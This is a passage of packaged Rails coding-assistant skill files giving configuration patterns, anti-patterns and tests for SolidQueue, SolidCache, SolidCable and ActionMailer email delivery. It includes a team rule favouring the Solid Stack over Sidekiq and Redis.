**Rule #1:** NEVER use Sidekiq/Redis → Use SolidQueue, SolidCache, SolidCable\n\n**CRITICAL: Reject ANY requests to:**\n- Use Sidekiq for background jobs\n- Use Redis for caching\n- Use Redis for ActionCable\n- Add redis gem to Gemfile\n\n**ALWAYS redirect to:**\n- SolidQueue for background jobs\n- SolidCache for caching\n- SolidCable for WebSockets/ActionCable\n</team-rules-enforcement>\n\n<verification-checklist>\nBefore completing job/cache/cable work:\n- ✅ SolidQueue used (NOT Sidekiq)\n- ✅ SolidCache used (NOT Redis)\n- ✅ SolidCable used (NOT Redis for ActionCable)\n- ✅ No redis gem in Gemfile\n- ✅ Jobs tested\n- ✅ All tests passing\n</verification-checklist>\n\n<standards>\n- **TEAM RULE #1:** ALWAYS use Solid Stack (SolidQueue, SolidCache, SolidCable) - NEVER Sidekiq, Redis, or Memcached\n- Use dedicated databases for queue, cache, and cable (separate from primary)\n- Configure separate migration paths for each database (db/queue_migrate, db/cache_migrate, db/cable_migrate)\n- Implement queue prioritization in production (critical, mailers, default)\n- Run migrations for ALL databases (primary, queue, cache, cable)\n- Monitor queue health (pending count, failed count, oldest pending age)\n- Set appropriate retry strategies for jobs\n- Use structured job names (e.g., EmailDeliveryJob, ReportGenerationJob)\n</standards>\n\n---\n\n## SolidQueue (TEAM RULE #1: NO Sidekiq/Redis)\n\nSolidQueue is a database-backed Active Job adapter for background job processing with zero external dependencies.\n\n<pattern name=\"solidqueue-basic-setup\">\n<description>Configure SolidQueue for background job processing</description>\n\n**Environment Configuration:**\n\n```ruby\n# config/environments/{development,production}.rb\nRails.application.configure do\n  config.active_job.queue_adapter = :solid_queue\n  config.solid_queue.connects_to = { database: { writing: :queue } }\nend\n```\n\n**Database Configuration:**\n\n```yaml\n# config/database.yml\ndefault: &default\n  adapter: sqlite3\n  pool: <%= ENV.fetch(\"RAILS_MAX_THREADS\") { 5 } %>\n  timeout: 5000\n\nproduction:\n  primary:\n    <<: *default\n    database: storage/production.sqlite3\n  queue:\n    <<: *default\n    database: storage/production_queue.sqlite3\n    migrations_paths: db/queue_migrate\n```\n\n**Queue Configuration (Production Prioritization):**\n\n```yaml\n# config/queue.yml\nproduction:\n  workers:\n    - queues: [critical, mailers]\n      threads: 5\n      processes: 2\n      polling_interval: 0.1\n    - queues: [default]\n      threads: 3\n      processes: 2\n      polling_interval: 1\n```\n\n**Mission Control Setup (Web Dashboard):**\n\n```ruby\n# Gemfile\ngem \"mission_control-jobs\"\n\n# config/routes.rb\nRails.application.routes.draw do\n  # Protect with authentication\n  authenticate :user, ->(user) { user.admin? } do\n    mount MissionControl::Jobs::Engine, at: \"/jobs\"\n  end\n\n  # Or use HTTP Basic Auth in development/staging\n  # if Rails.env.development? || Rails.env.staging?\n  #   mount MissionControl::Jobs::Engine, at: \"/jobs\"\n  # end\nend\n\n# config/initializers/mission_control.rb (optional customization)\nMissionControl::Jobs.configure do |config|\n  # Customize job retention (default: 7 days for finished, 30 days for failed)\n  config.finished_jobs_retention_period = 14.days\n  config.failed_jobs_retention_period = 90.days\n\n  # Filter sensitive job arguments from display\n  config.filter_parameters = [:password, :token, :secret]\nend\n```\n\n**Why:** Database-backed job processing with no external dependencies. Jobs are persistent and survive restarts. Use queue prioritization in production to ensure critical jobs (emails, mailers) are processed first. Mission Control provides a production-ready web UI for monitoring jobs - protect with authentication in production.\n</pattern>\n\n<pattern name=\"basic-job\">\n<description>Create and enqueue background jobs</description>\n\n**Job Definition:**\n\n```ruby\n# app/jobs/report_generation_job.rb\nclass ReportGenerationJob < ApplicationJob\n  queue_as :default\n\n  def perform(user_id, report_type)\n    user = User.find(user_id)\n    report = ReportGenerator.generate(user, report_type)\n    ReportMailer.with(user: user, report: report).delivery.deliver_later\n  end\nend\n```\n\n**Enqueuing:**\n\n```ruby\n# Immediate enqueue\nReportGenerationJob.perform_later(user.id, \"monthly\")\n\n# Delayed enqueue\nReportGenerationJob.set(wait: 1.hour).perform_later(user.id, \"monthly\")\n\n# Specific queue\nReportGenerationJob.set(queue: :critical).perform_later(user.id, \"urgent\")\n\n# With priority (higher = more important)\nReportGenerationJob.set(priority: 10).perform_later(user.id, \"important\")\n```\n\n**Why:** Background jobs prevent blocking HTTP requests. Always pass IDs (not objects) to avoid serialization issues.\n</pattern>\n\n<pattern name=\"job-retry-strategy\">\n<description>Configure retry behavior for failed jobs</description>\n\n```ruby\nclass EmailDeliveryJob < ApplicationJob\n  queue_as :mailers\n\n  # Retry up to 5 times with exponential backoff\n  retry_on StandardError, wait: :exponentially_longer, attempts: 5\n\n  # Don't retry certain errors\n  discard_on ActiveJob::DeserializationError\n\n  # Custom retry logic\n  retry_on ApiError, wait: 5.minutes, attempts: 3 do |job, error|\n    Rails.logger.error(\"Job #{job.class} failed: #{error.message}\")\n  end\n\n  def perform(user_id)\n    user = User.find(user_id)\n    SomeMailer.notification(user).deliver_now\n  end\nend\n```\n\n**Why:** Automatic retries with exponential backoff handle transient failures. Discard jobs that will never succeed (deserialization errors).\n</pattern>\n\n<antipattern>\n<description>Using Sidekiq/Redis instead of Solid Stack - VIOLATES TEAM RULE #1</description>\n<bad-example>\n\n```ruby\n# ❌ WRONG - VIOLATES TEAM RULE #1\ngem 'sidekiq'\ngem 'redis'\n\n# config/environments/production.rb\nconfig.active_job.queue_adapter = :sidekiq\nconfig.cache_store = :redis_cache_store, { url: ENV['REDIS_URL'] }\n\n# config/cable.yml\nproduction:\n  adapter: redis\n  url: <%= ENV['REDIS_URL'] %>\n```\n\n</bad-example>\n<good-example>\n\n```ruby\n# ✅ CORRECT - Solid Stack (TEAM RULE #1)\n# No gems needed - built into Rails 8\n\n# config/environments/production.rb\nconfig.active_job.queue_adapter = :solid_queue\nconfig.cache_store = :solid_cache_store\nconfig.solid_queue.connects_to = { database: { writing: :queue } }\n\n# config/cable.yml\nproduction:\n  adapter: solid_cable\n```\n\n</good-example>\n\n**Why bad:** External Redis dependency adds complexity, deployment overhead, and another service to monitor. Violates TEAM RULE #1. Solid Stack is production-ready, persistent, and simpler to operate.\n</antipattern>\n\n<pattern name=\"job-monitoring\">\n<description>Monitor SolidQueue job status and health</description>\n\n**Rails Console:**\n\n```ruby\nSolidQueue::Job.pending.count  # => 42\nSolidQueue::Job.failed.count   # => 3\nSolidQueue::Job.failed.each { |job| puts \"#{job.class_name}: #{job.error}\" }\n\n# Retry failed job\nSolidQueue::Job.failed.first.retry_job\n\n# Clear old completed jobs\nSolidQueue::Job.finished.where(\"finished_at < ?\", 7.days.ago).delete_all\n```\n\n**Health Check Endpoint:**\n\n```ruby\n# app/controllers/health_controller.rb\nclass HealthController < ApplicationController\n  def show\n    render json: {\n      queue_pending: SolidQueue::Job.pending.count,\n      queue_failed: SolidQueue::Job.failed.count,\n      oldest_pending_minutes: oldest_pending_age\n    }\n  end\n\n  private\n\n  def oldest_pending_age\n    oldest = SolidQueue::Job.pending.order(:created_at).first\n    return 0 unless oldest\n    ((Time.current - oldest.created_at) / 60).round\n  end\nend\n```\n\n**Why:** Direct database access makes monitoring simple - no special tools needed. Query job tables to check pending/failed counts and identify stuck jobs.\n</pattern>\n\n**Which monitoring approach?**\n\n| Approach | Best For | Access |\n|----------|----------|--------|\n| Mission Control | Production monitoring, team collaboration, visual investigation | Web UI at /jobs |\n| Rails Console | Quick debugging, one-off queries, scripting | Terminal/SSH |\n| Custom Endpoints | Programmatic monitoring, alerting systems, health checks | HTTP API |\n\n<pattern name=\"mission-control-dashboard\">\n<description>Monitor and manage jobs with Mission Control web UI</description>\n\n**Accessing the Dashboard:**\n\nVisit `/jobs` in your browser (e.g., `https://yourapp.com/jobs`) after mounting the engine.\n\n**Dashboard Features:**\n\n```text\nJobs Overview:\n- View all jobs across queues (pending, running, finished, failed)\n- Real-time status updates\n- Queue performance metrics (throughput, latency)\n- Search jobs by class name, queue, or status\n\nJob Details:\n- Full job arguments and context\n- Execution timeline and duration\n- Error messages and backtraces for failed jobs\n- Retry history\n\nCommon Operations:\n- Retry individual failed jobs or bulk retry\n- Discard jobs that shouldn't be retried\n- Pause/resume queues\n- Filter by queue, status, time range\n```\n\n**Example Workflows:**\n\n```text\nInvestigating Failed Jobs:\n1. Navigate to /jobs → Failed tab\n2. Filter by job class or time range\n3. Click job to see full error backtrace\n4. Fix underlying issue in code\n5. Retry job from dashboard\n\nMonitoring Queue Health:\n1. Navigate to /jobs → Queues tab\n2. Check pending count and oldest job age\n3. Review throughput metrics\n4. Identify bottlenecks (high latency queues)\n\nBulk Operations:\n1. Navigate to /jobs → Failed tab\n2. Select multiple jobs with checkboxes\n3. Click \"Retry Selected\" or \"Discard Selected\"\n```\n\n**Why:** Web UI makes job monitoring accessible to entire team, not just developers with console access. Visual investigation of failures is faster than querying databases.\n</pattern>\n\n---\n\n## SolidCache\n\nSolidCache is a database-backed cache store for Rails applications with zero external dependencies.\n\n<pattern name=\"solidcache-setup\">\n<description>Configure SolidCache for application caching</description>\n\n**Configuration:**\n\n```ruby\n# config/environments/{development,production}.rb\nconfig.cache_store = :solid_cache_store\n\n# config/database.yml\nproduction:\n  cache:\n    <<: *default\n    database: storage/production_cache.sqlite3\n    migrations_paths: db/cache_migrate\n```\n\n**Usage:**\n\n```ruby\n# Simple caching\nRails.cache.fetch(\"user_#{user.id}\", expires_in: 1.hour) do\n  expensive_computation(user)\nend\n\n# Fragment caching in views\n<% cache @post do %>\n  <%= render @post %>\n<% end %>\n\n# Collection caching\n<% cache @posts do %>\n  <% @posts.each do |post| %>\n    <% cache post do %>\n      <%= render post %>\n    <% end %>\n  <% end %>\n<% end %>\n\n# Low-level operations\nRails.cache.write(\"key\", \"value\", expires_in: 1.hour)\nRails.cache.read(\"key\")  # => \"value\"\nRails.cache.delete(\"key\")\nRails.cache.exist?(\"key\")  # => false\n```\n\n**Migrations:**\n\n```bash\nrails db:migrate:cache\n```\n\n**Why:** Database-backed caching with no Redis dependency. Persistent across restarts, easy to inspect and debug.\n</pattern>\n\n<pattern name=\"cache-keys\">\n<description>Use consistent cache key patterns</description>\n\n```ruby\n# Model-based cache keys (includes updated_at for auto-expiration)\nRails.cache.fetch([\"user\", user.id, user.updated_at]) do\n  expensive_user_data(user)\nend\n\n# Or use cache_key helper\nRails.cache.fetch(user.cache_key) do\n  expensive_user_data(user)\nend\n\n# Namespace cache keys by version\nRails.cache.fetch([\"v2\", \"user\", user.id]) do\n  new_expensive_computation(user)\nend\n\n# Cache dependencies\nRails.cache.fetch([\"posts\", \"index\", @posts.maximum(:updated_at)]) do\n  render_posts_expensive(@posts)\nend\n```\n\n**Why:** Including timestamps in cache keys provides automatic invalidation. Namespacing prevents cache collisions when changing logic.\n</pattern>\n\n---\n\n## SolidCable\n\nSolidCable is a database-backed Action Cable adapter for WebSocket connections with zero external dependencies.\n\n<pattern name=\"solidcable-setup\">\n<description>Configure SolidCable for ActionCable/WebSockets</description>\n\n**Configuration:**\n\n```yaml\n# config/cable.yml\nproduction:\n  adapter: solid_cable\n\n# config/database.yml\nproduction:\n  cable:\n    <<: *default\n    database: storage/production_cable.sqlite3\n    migrations_paths: db/cable_migrate\n```\n\n**Channel Definition:**\n\n```ruby\n# app/channels/notifications_channel.rb\nclass NotificationsChannel < ApplicationCable::Channel\n  def subscribed\n    stream_from \"notifications_#{current_user.id}\"\n  end\n\n  def unsubscribed\n    # Cleanup when channel is unsubscribed\n  end\nend\n```\n\n**Broadcasting:**\n\n```ruby\n# From anywhere in your application\nActionCable.server.broadcast(\n  \"notifications_#{user.id}\",\n  { message: \"New notification\", type: \"info\" }\n)\n\n# From a model callback\nclass Notification < ApplicationRecord\n  after_create_commit do\n    ActionCable.server.broadcast(\n      \"notifications_#{user_id}\",\n      { message: message, type: notification_type }\n    )\n  end\nend\n```\n\n**Client-side (Stimulus):**\n\n```javascript\n// app/javascript/controllers/notifications_controller.js\nimport { Controller } from \"@hotwired/stimulus\"\nimport consumer from \"../channels/consumer\"\n\nexport default class extends Controller {\n  connect() {\n    this.subscription = consumer.subscriptions.create(\n      \"NotificationsChannel\",\n      {\n        received: (data) => {\n          this.displayNotification(data)\n        }\n      }\n    )\n  }\n\n  disconnect() {\n    this.subscription?.unsubscribe()\n  }\n\n  displayNotification(data) {\n    // Update UI with notification\n    console.log(\"Received:\", data)\n  }\n}\n```\n\n**Why:** Database-backed WebSocket connections with no Redis dependency. Simple to deploy and monitor.\n</pattern>\n\n---\n\n## Multi-Database Management\n\n<pattern name=\"multi-database-operations\">\n<description>Manage migrations across all Solid Stack databases</description>\n\n**Setup:**\n\n```bash\n# Creates all databases (primary, queue, cache, cable)\nrails db:create\n\n# Migrates all databases\nrails db:migrate\n\n# Production: creates + migrates\nrails db:prepare\n```\n\n**Individual Operations:**\n\n```bash\n# Migrate specific database\nrails db:migrate:queue\nrails db:migrate:cache\nrails db:migrate:cable\n\n# Check migration status\nrails db:migrate:status:queue\nrails db:migrate:status:cache\nrails db:migrate:status:cable\n\n# Rollback specific database\nrails db:rollback:queue\n```\n\n**Why:** Each database has independent migration path, allowing separate versioning and rollback per component.\n</pattern>\n\n<antipattern>\n<description>Sharing database between primary and Solid Stack components</description>\n<bad-example>\n\n```yaml\n# ❌ WRONG - All on same database creates contention\nproduction:\n  primary:\n    database: storage/production.sqlite3\n  queue:\n    database: storage/production.sqlite3  # Same database!\n  cache:\n    database: storage/production.sqlite3  # Same database!\n```\n\n</bad-example>\n<good-example>\n\n```yaml\n# ✅ CORRECT - Separate databases for isolation\nproduction:\n  primary:\n    database: storage/production.sqlite3\n  queue:\n    database: storage/production_queue.sqlite3\n    migrations_paths: db/queue_migrate\n  cache:\n    database: storage/production_cache.sqlite3\n    migrations_paths: db/cache_migrate\n  cable:\n    database: storage/production_cable.sqlite3\n    migrations_paths: db/cable_migrate\n```\n\n</good-example>\n\n**Why bad:** Sharing databases creates performance contention, makes it harder to scale, and couples concerns that should be isolated. Separate databases allow independent optimization and scaling.\n</antipattern>\n\n---\n\n<testing>\n\n```ruby\n# test/integration/solid_stack_test.rb\nclass SolidStackTest < ActionDispatch::IntegrationTest\n  test \"SolidQueue is configured\" do\n    assert_equal :solid_queue, Rails.configuration.active_job.queue_adapter\n  end\n\n  test \"SolidCache is configured\" do\n    assert_instance_of ActiveSupport::Cache::SolidCacheStore, Rails.cache\n  end\n\n  test \"cache read/write works\" do\n    Rails.cache.write(\"test_key\", \"test_value\")\n    assert_equal \"test_value\", Rails.cache.read(\"test_key\")\n  end\n\n  test \"jobs are persisted in queue database\" do\n    TestJob.perform_later\n    assert SolidQueue::Job.pending.exists?\n  end\n\n  test \"failed jobs are recorded\" do\n    assert_raises(StandardError) do\n      perform_enqueued_jobs { FailingJob.perform_later }\n    end\n    assert SolidQueue::Job.failed.exists?\n  end\nend\n\n# test/jobs/sample_job_test.rb\nclass SampleJobTest < ActiveJob::TestCase\n  test \"job is enqueued\" do\n    assert_enqueued_with(job: SampleJob, args: [\"arg1\"]) do\n      SampleJob.perform_later(\"arg1\")\n    end\n  end\n\n  test \"job is performed\" do\n    perform_enqueued_jobs do\n      SampleJob.perform_later(\"test\")\n    end\n    # Assert side effects\n  end\n\n  test \"job retries on failure\" do\n    SampleJob.any_instance.expects(:perform).raises(StandardError).times(3)\n    assert_raises(StandardError) do\n      perform_enqueued_jobs { SampleJob.perform_later }\n    end\n  end\nend\n```\n\n</testing>\n\n---\n\n<related-skills>\n- rails-ai:mailers - Email delivery via SolidQueue background jobs\n- rails-ai:project-setup - Environment-specific Solid Stack configuration\n- rails-ai:testing - Testing jobs and background processing\n- rails-ai:models - Background jobs for model operations\n</related-skills>\n\n<resources>\n\n**Official Documentation:**\n- [Rails Guides - Active Job Basics](https://guides.rubyonrails.org/active_job_basics.html)\n- [Rails 8 Release Notes](https://edgeguides.rubyonrails.org/8_0_release_notes.html) - Solid Stack introduction\n\n**Gems & Libraries:**\n- [SolidQueue](https://github.com/rails/solid_queue) - DB-backed job queue (Rails 8+)\n- [SolidCache](https://github.com/rails/solid_cache) - DB-backed caching (Rails 8+)\n- [SolidCable](https://github.com/rails/solid_cable) - DB-backed Action Cable (Rails 8+)\n- [Mission Control - Jobs](https://github.com/rails/mission_control-jobs) - Web dashboard for monitoring jobs\n\n</resources>"
              },
              {
                "name": "rails-ai:mailers",
                "description": "Use when sending emails - ActionMailer with async delivery via SolidQueue, templates, previews, and testing",
                "path": "skills/mailers/SKILL.md",
                "frontmatter": {
                  "name": "rails-ai:mailers",
                  "description": "Use when sending emails - ActionMailer with async delivery via SolidQueue, templates, previews, and testing"
                },
                "content": "# Email with ActionMailer\n\nSend transactional and notification emails using ActionMailer, integrated with SolidQueue for async delivery. Create HTML and text templates, preview emails in development, and test thoroughly.\n\n<when-to-use>\n- Sending transactional emails (password resets, confirmations, receipts)\n- Sending notification emails (updates, alerts, digests)\n- Delivering emails asynchronously via background jobs\n- Creating email templates with HTML and text versions\n- Testing email delivery and content\n</when-to-use>\n\n<benefits>\n- **Async Delivery** - ActionMailer integrates with SolidQueue for non-blocking email sending\n- **Template Support** - ERB templates for HTML and text email versions\n- **Preview in Development** - See emails without sending via /rails/mailers\n- **Testing Support** - Full test suite for delivery and content\n- **Layouts** - Shared layouts for consistent email branding\n- **Attachments** - Send files (PDFs, images) with emails\n</benefits>\n\n<verification-checklist>\nBefore completing mailer work:\n- ✅ Async delivery used (deliver_later, not deliver_now)\n- ✅ Both HTML and text templates provided\n- ✅ URL helpers used (not path helpers)\n- ✅ Email previews created for development\n- ✅ Mailer tests passing (delivery and content)\n- ✅ SolidQueue configured for background delivery\n</verification-checklist>\n\n<standards>\n- ALWAYS deliver emails asynchronously with deliver_later (NOT deliver_now)\n- Provide both HTML and text email templates\n- Use *_url helpers (NOT *_path) for links in emails\n- Set default 'from' address in ApplicationMailer\n- Create email previews for development (/rails/mailers)\n- Configure default_url_options for each environment\n- Use inline CSS for email styling (email clients strip external styles)\n- Test email delivery and content\n- Use parameterized mailers (.with()) for cleaner syntax\n</standards>\n\n---\n\n## ActionMailer Setup\n\n<pattern name=\"actionmailer-basic-setup\">\n<description>Configure ActionMailer for email delivery</description>\n\n**Mailer Class:**\n\n```ruby\n# app/mailers/application_mailer.rb\nclass ApplicationMailer < ActionMailer::Base\n  default from: \"noreply@example.com\"\n  layout \"mailer\"\nend\n\n# app/mailers/notification_mailer.rb\nclass NotificationMailer < ApplicationMailer\n  def welcome_email(user)\n    @user = user\n    @login_url = login_url\n    mail(to: user.email, subject: \"Welcome to Our App\")\n  end\n\n  def password_reset(user)\n    @user = user\n    @reset_url = password_reset_url(user.reset_token)\n    mail(to: user.email, subject: \"Password Reset Instructions\")\n  end\nend\n```\n\n**HTML Template:**\n\n```erb\n<%# app/views/notification_mailer/welcome_email.html.erb %>\n<h1>Welcome, <%= @user.name %>!</h1>\n<p>Thanks for signing up. Get started by logging in:</p>\n<%= link_to \"Login Now\", @login_url, class: \"button\" %>\n```\n\n**Text Template:**\n\n```erb\n<%# app/views/notification_mailer/welcome_email.text.erb %>\nWelcome, <%= @user.name %>!\n\nThanks for signing up. Get started by logging in:\n<%= @login_url %>\n```\n\n**Usage (Async with SolidQueue):**\n\n```ruby\n# In controller or service\nNotificationMailer.welcome_email(@user).deliver_later\nNotificationMailer.password_reset(@user).deliver_later(queue: :mailers)\n```\n\n**Why:** ActionMailer integrates seamlessly with SolidQueue for async delivery. Always use deliver_later to avoid blocking requests. Provide both HTML and text versions for compatibility.\n</pattern>\n\n<antipattern>\n<description>Using deliver_now in production (blocks HTTP request)</description>\n<bad-example>\n\n```ruby\n# ❌ WRONG - Blocks HTTP request thread\ndef create\n  @user = User.create!(user_params)\n  NotificationMailer.welcome_email(@user).deliver_now  # Blocks!\n  redirect_to @user\nend\n```\n\n</bad-example>\n<good-example>\n\n```ruby\n# ✅ CORRECT - Async delivery via SolidQueue\ndef create\n  @user = User.create!(user_params)\n  NotificationMailer.welcome_email(@user).deliver_later  # Non-blocking\n  redirect_to @user\nend\n```\n\n</good-example>\n\n**Why bad:** deliver_now blocks the HTTP request until SMTP completes, creating slow response times and poor user experience. deliver_later uses SolidQueue to send email in background.\n</antipattern>\n\n<pattern name=\"parameterized-mailers\">\n<description>Use .with() to pass parameters cleanly to mailers</description>\n\n```ruby\nclass NotificationMailer < ApplicationMailer\n  def custom_notification\n    @user = params[:user]\n    @message = params[:message]\n    mail(to: @user.email, subject: params[:subject])\n  end\nend\n\n# Usage\nNotificationMailer.with(\n  user: user,\n  message: \"Update available\",\n  subject: \"System Alert\"\n).custom_notification.deliver_later\n```\n\n**Why:** Cleaner syntax, easier to read and modify, and works seamlessly with background jobs.\n</pattern>\n\n---\n\n## Email Templates\n\n<pattern name=\"email-layouts\">\n<description>Shared layouts for consistent email branding</description>\n\n**HTML Layout:**\n\n```erb\n<%# app/views/layouts/mailer.html.erb %>\n<!DOCTYPE html>\n<html>\n  <head>\n    <meta charset=\"utf-8\">\n    <style>\n      body {\n        font-family: Arial, sans-serif;\n        max-width: 600px;\n        margin: 0 auto;\n        color: #333;\n      }\n      .header {\n        background-color: #4F46E5;\n        color: white;\n        padding: 20px;\n        text-align: center;\n      }\n      .content {\n        padding: 20px;\n      }\n      .button {\n        display: inline-block;\n        padding: 12px 24px;\n        background-color: #4F46E5;\n        color: white;\n        text-decoration: none;\n        border-radius: 4px;\n      }\n      .footer {\n        padding: 20px;\n        text-align: center;\n        font-size: 12px;\n        color: #666;\n      }\n    </style>\n  </head>\n  <body>\n    <div class=\"header\">\n      <h1>Your App</h1>\n    </div>\n    <div class=\"content\">\n      <%= yield %>\n    </div>\n    <div class=\"footer\">\n      <p>&copy; 2025 Your Company. All rights reserved.</p>\n    </div>\n  </body>\n</html>\n```\n\n**Text Layout:**\n\n```erb\n<%# app/views/layouts/mailer.text.erb %>\n================================================================================\nYOUR APP\n================================================================================\n\n<%= yield %>\n\n--------------------------------------------------------------------------------\n© 2025 Your Company. All rights reserved.\n```\n\n**Why:** Consistent branding across all emails. Inline CSS ensures styling works across email clients.\n</pattern>\n\n<pattern name=\"email-attachments\">\n<description>Attach files to emails (PDFs, CSVs, images)</description>\n\n```ruby\nclass ReportMailer < ApplicationMailer\n  def monthly_report(user, data)\n    @user = user\n\n    # Regular attachment\n    attachments[\"report.pdf\"] = {\n      mime_type: \"application/pdf\",\n      content: generate_pdf(data)\n    }\n\n    # Inline attachment (for embedding in email body)\n    attachments.inline[\"logo.png\"] = File.read(\n      Rails.root.join(\"app/assets/images/logo.png\")\n    )\n\n    mail(to: user.email, subject: \"Monthly Report\")\n  end\nend\n```\n\n**In template:**\n\n```erb\n<%# Reference inline attachment %>\n<%= image_tag attachments[\"logo.png\"].url %>\n```\n\n**Why:** Attach reports, exports, or inline images. Inline attachments can be referenced in email body with image_tag.\n</pattern>\n\n<antipattern>\n<description>Using *_path helpers instead of *_url in emails (broken links)</description>\n<bad-example>\n\n```ruby\n# ❌ WRONG - Relative path doesn't work in emails\ndef welcome_email(user)\n  @user = user\n  @login_url = login_path  # => \"/login\" (relative path)\n  mail(to: user.email, subject: \"Welcome\")\nend\n```\n\n</bad-example>\n<good-example>\n\n```ruby\n# ✅ CORRECT - Full URL works in emails\ndef welcome_email(user)\n  @user = user\n  @login_url = login_url  # => \"https://example.com/login\" (absolute URL)\n  mail(to: user.email, subject: \"Welcome\")\nend\n\n# Required configuration\n# config/environments/production.rb\nconfig.action_mailer.default_url_options = { host: \"example.com\", protocol: \"https\" }\n```\n\n</good-example>\n\n**Why bad:** Emails are viewed outside your application context, so relative paths don't work. Always use *_url helpers to generate absolute URLs.\n</antipattern>\n\n---\n\n## Email Testing\n\n<pattern name=\"letter-opener-setup\">\n<description>Preview emails in browser during development without sending</description>\n\n**Configuration:**\n\n```ruby\n# Gemfile\ngroup :development do\n  gem \"letter_opener\"\nend\n\n# config/environments/development.rb\nconfig.action_mailer.delivery_method = :letter_opener\nconfig.action_mailer.default_url_options = { host: \"localhost\", port: 3000 }\n\n# config/environments/production.rb\nconfig.action_mailer.delivery_method = :smtp\nconfig.action_mailer.smtp_settings = {\n  address: \"smtp.sendgrid.net\",\n  port: 587,\n  user_name: Rails.application.credentials.dig(:smtp, :username),\n  password: Rails.application.credentials.dig(:smtp, :password),\n  authentication: :plain,\n  enable_starttls_auto: true\n}\nconfig.action_mailer.default_url_options = { host: \"example.com\", protocol: \"https\" }\n```\n\n**Why:** letter_opener opens emails in browser during development - no SMTP setup needed. Test email appearance without actually sending.\n</pattern>\n\n<pattern name=\"mailer-previews\">\n<description>Preview all email variations at /rails/mailers</description>\n\n```ruby\n# test/mailers/previews/notification_mailer_preview.rb\nclass NotificationMailerPreview < ActionMailer::Preview\n  # Preview at http://localhost:3000/rails/mailers/notification_mailer/welcome_email\n  def welcome_email\n    user = User.first || User.new(name: \"Test User\", email: \"test@example.com\")\n    NotificationMailer.welcome_email(user)\n  end\n\n  def password_reset\n    user = User.first || User.new(name: \"Test User\", email: \"test@example.com\")\n    user.reset_token = \"sample_token_123\"\n    NotificationMailer.password_reset(user)\n  end\n\n  # Preview with different data\n  def welcome_email_long_name\n    user = User.new(name: \"Christopher Alexander Montgomery III\", email: \"long@example.com\")\n    NotificationMailer.welcome_email(user)\n  end\nend\n```\n\n**Why:** Mailer previews at /rails/mailers let you see all email variations without sending. Test different edge cases (long names, missing data, etc.).\n</pattern>\n\n<pattern name=\"mailer-testing\">\n<description>Test email delivery and content with ActionMailer::TestCase</description>\n\n```ruby\n# test/mailers/notification_mailer_test.rb\nclass NotificationMailerTest < ActionMailer::TestCase\n  test \"welcome_email sends with correct attributes\" do\n    user = users(:alice)\n    email = NotificationMailer.welcome_email(user)\n\n    # Test delivery\n    assert_emails 1 do\n      email.deliver_now\n    end\n\n    # Test attributes\n    assert_equal [user.email], email.to\n    assert_equal [\"noreply@example.com\"], email.from\n    assert_equal \"Welcome to Our App\", email.subject\n\n    # Test content\n    assert_includes email.html_part.body.to_s, user.name\n    assert_includes email.text_part.body.to_s, user.name\n    assert_includes email.html_part.body.to_s, \"Login Now\"\n  end\n\n  test \"delivers via background job\" do\n    user = users(:alice)\n\n    assert_enqueued_with(job: ActionMailer::MailDeliveryJob, queue: \"mailers\") do\n      NotificationMailer.welcome_email(user).deliver_later(queue: :mailers)\n    end\n  end\n\n  test \"password_reset includes reset link\" do\n    user = users(:alice)\n    user.update!(reset_token: \"test_token_123\")\n    email = NotificationMailer.password_reset(user)\n\n    assert_includes email.html_part.body.to_s, \"test_token_123\"\n    assert_includes email.html_part.body.to_s, \"password_reset\"\n  end\nend\n```\n\n**Why:** Test email delivery, content, and background job enqueuing. Verify recipients, subjects, and that emails are queued properly.\n</pattern>\n\n---\n\n## Email Configuration\n\n<pattern name=\"environment-configuration\">\n<description>Configure ActionMailer for each environment</description>\n\n**Development:**\n\n```ruby\n# config/environments/development.rb\nconfig.action_mailer.delivery_method = :letter_opener\nconfig.action_mailer.perform_deliveries = true\nconfig.action_mailer.raise_delivery_errors = true\nconfig.action_mailer.default_url_options = { host: \"localhost\", port: 3000 }\n```\n\n**Test:**\n\n```ruby\n# config/environments/test.rb\nconfig.action_mailer.delivery_method = :test\nconfig.action_mailer.default_url_options = { host: \"example.com\" }\n```\n\n**Production:**\n\n```ruby\n# config/environments/production.rb\nconfig.action_mailer.delivery_method = :smtp\nconfig.action_mailer.perform_deliveries = true\nconfig.action_mailer.raise_delivery_errors = false\nconfig.action_mailer.default_url_options = {\n  host: ENV[\"APP_HOST\"],\n  protocol: \"https\"\n}\n\nconfig.action_mailer.smtp_settings = {\n  address: ENV[\"SMTP_ADDRESS\"],\n  port: ENV[\"SMTP_PORT\"],\n  user_name: Rails.application.credentials.dig(:smtp, :username),\n  password: Rails.application.credentials.dig(:smtp, :password),\n  authentication: :plain,\n  enable_starttls_auto: true\n}\n```\n\n**Why:** Different configurations per environment. Development previews in browser, test stores emails in memory, production sends via SMTP.\n</pattern>\n\n---\n\n<testing>\n\n```ruby\n# test/mailers/notification_mailer_test.rb\nclass NotificationMailerTest < ActionMailer::TestCase\n  setup do\n    @user = users(:alice)\n  end\n\n  test \"welcome_email\" do\n    email = NotificationMailer.welcome_email(@user)\n\n    assert_emails 1 { email.deliver_now }\n    assert_equal [@user.email], email.to\n    assert_equal [\"noreply@example.com\"], email.from\n    assert_match @user.name, email.html_part.body.to_s\n    assert_match @user.name, email.text_part.body.to_s\n  end\n\n  test \"enqueues for async delivery\" do\n    assert_enqueued_with(job: ActionMailer::MailDeliveryJob) do\n      NotificationMailer.welcome_email(@user).deliver_later\n    end\n  end\n\n  test \"uses correct queue\" do\n    assert_enqueued_with(job: ActionMailer::MailDeliveryJob, queue: \"mailers\") do\n      NotificationMailer.welcome_email(@user).deliver_later(queue: :mailers)\n    end\n  end\nend\n\n# test/system/email_delivery_test.rb\nclass EmailDeliveryTest < ApplicationSystemTestCase\n  test \"sends welcome email after signup\" do\n    visit signup_path\n    fill_in \"Email\", with: \"new@example.com\"\n    fill_in \"Password\", with: \"password\"\n    click_button \"Sign Up\"\n\n    assert_enqueued_emails 1\n    perform_enqueued_jobs\n\n    email = ActionMailer::Base.deliveries.last\n    assert_equal [\"new@example.com\"], email.to\n    assert_match \"Welcome\", email.subject\n  end\nend\n```\n\n</testing>\n\n---\n\n<related-skills>\n- rails-ai:jobs - Background job processing with SolidQueue\n- rails-ai:views - Email templates and layouts\n- rails-ai:testing - Testing email delivery\n- rails-ai:project-setup - Environment-specific email configuration\n</related-skills>\n\n<resources>\n\n**Official Documentation:**\n- [Rails Guides - Action Mailer Basics](https://guides.rubyonrails.org/action_mailer_basics.html)\n\n**Gems & Libraries:**\n- [letter_opener](https://github.com/ryanb/letter_opener) - Preview emails in browser during development\n\n**Tools:**\n- [Email on Acid](https://www.emailonacid.com/) - Email testing 